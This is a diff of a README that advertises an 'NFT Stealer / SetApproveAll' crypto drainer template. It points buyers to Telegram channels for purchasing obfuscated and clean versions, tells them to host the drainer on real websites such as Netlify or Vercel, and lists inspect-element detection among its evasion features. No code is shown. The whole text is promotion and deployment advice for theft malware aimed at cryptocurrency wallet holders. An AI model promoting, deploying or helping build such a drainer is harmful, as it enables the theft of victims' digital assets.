@@ -1,6 +1,5 @@
 ## ⚠️ Maybe not working, Opensea API changed, if you want a good setapproval script, buy on [Telegram](https://t.me/TecOnSellix)
-### 📩 You need to host it on a real website for it to work (recommended: Hostinger, Netlify, Vercel), 
-### To Buy The Full Clean & deobfuscated Scripts Or For Any Other Types Of Scripts & Development Orders Message us here: [@CryptoDrainers](https://t.me/cryptodrainers)
+### To Buy The Full not obfuscated Scripts Or For Any Other Types Of Scripts & Development Orders Message us here: [@CryptoDrainers](https://t.me/cryptodrainers)
 
 ---
 ## 🎁 Full NFT Stealer / SetApproveAll Method / V0.01 Drainer Template
@@ -11,6 +10,8 @@
 
 ![logs](https://cdn.discordapp.com/attachments/980457515164782592/980498248265510912/lOasiRiAeW.png)
 ---
+
+### 📩 You need to host it on a real website for it to work (recommended: Hostinger, Netlify, Vercel), 
 
 ## `🛡️ Features`
 - [x] Inspect Element Detection
